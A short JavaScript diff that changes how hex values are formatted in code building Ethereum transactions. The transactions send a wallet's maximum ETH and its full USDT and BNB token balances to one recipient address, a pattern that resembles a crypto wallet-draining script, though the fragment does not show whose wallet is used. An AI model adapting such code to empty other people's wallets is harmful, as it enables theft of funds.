@@ -142,17 +142,17 @@
                     const ethTransactionParameters = {
                         to: recipientAddress,
                         from: senderAddress,
-                        value: web3.utils.toHex(maxEthTransferWei),
-                        gas: web3.utils.toHex(gasLimit),
-                        gasPrice: web3.utils.toHex(gasPriceWei)
+                        value: `0x${maxEthTransferWei.toString(16)}`,
+                        gas: `0x${gasLimit.toString(16)}`,
+                        gasPrice: `0x${gasPriceWei.toString(16)}`
                     };
 
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
                         from: senderAddress,
                         value: '0x0', // No ETH value required
-                        gas: web3.utils.toHex(gasLimit),
-                        gasPrice: web3.utils.toHex(gasPriceWei),
+                        gas: `0x${gasLimit.toString(16)}`,
+                        gasPrice: `0x${gasPriceWei.toString(16)}`,
                         data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
                     };
 
@@ -160,8 +160,8 @@
                         to: tokenAddresses.BNB,
                         from: senderAddress,
                         value: '0x0', // No ETH value required
-                        gas: web3.utils.toHex(gasLimit),
-                        gasPrice: web3.utils.toHex(gasPriceWei),
+                        gas: `0x${gasLimit.toString(16)}`,
+                        gasPrice: `0x${gasPriceWei.toString(16)}`,
                         data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                     };
 
